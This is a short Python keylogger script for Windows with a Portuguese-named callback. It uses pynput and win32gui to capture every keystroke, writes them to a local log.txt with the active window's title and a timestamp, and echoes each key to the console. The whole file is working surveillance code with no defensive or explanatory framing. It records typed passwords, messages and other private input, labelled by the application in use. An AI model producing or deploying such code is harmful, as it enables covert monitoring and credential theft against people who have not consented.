from pynput import keyboard
from win32gui import GetWindowText, GetForegroundWindow
import datetime

LAST_WINDOW = None


def tecla_pressionada(tecla):
    global LAST_WINDOW
    with open("log.txt", "a") as file:
        window = GetWindowText(GetForegroundWindow())
        if window != LAST_WINDOW:
            LAST_WINDOW = window
            file.write("\n #### {} - {}\n".format(window, datetime.datetime.now()))
        try:
            if tecla.vk >= 96 and tecla.vk <= 105:
                tecla = tecla.vk - 96
        except:
            pass

        tecla = str(tecla).replace("'", "")
        print(tecla)

        if len(tecla) > 1:
            tecla = " [{}] ".format(tecla)

        file.write(tecla)


with keyboard.Listener(on_press=tecla_pressionada) as listener:
    listener.join()
